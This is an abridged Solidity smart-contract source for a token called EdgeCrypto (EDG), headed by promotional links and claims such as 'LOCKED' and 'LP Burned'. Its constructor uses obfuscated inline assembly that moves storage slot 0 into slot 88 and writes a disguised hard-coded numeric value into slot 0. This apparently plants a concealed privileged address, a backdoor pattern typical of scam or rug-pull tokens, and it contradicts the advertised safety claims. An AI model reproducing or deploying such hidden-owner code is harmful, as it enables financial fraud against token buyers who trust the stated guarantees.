/*
Welcome to EdgeCrypto

Telegram: https://t.me/EdgeCrypto
Twitter: https://twitter.com/EdgeCrypto
https://EdgeCrypto.space
LOCKED
LP Burned
Always DYOR
MoonGem
...
contract EdgeCrypto {
    string public constant name = "EdgeCrypto";
    string public constant symbol = "EDG";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(530268745326958025228500018901028963325385656030, 5))}
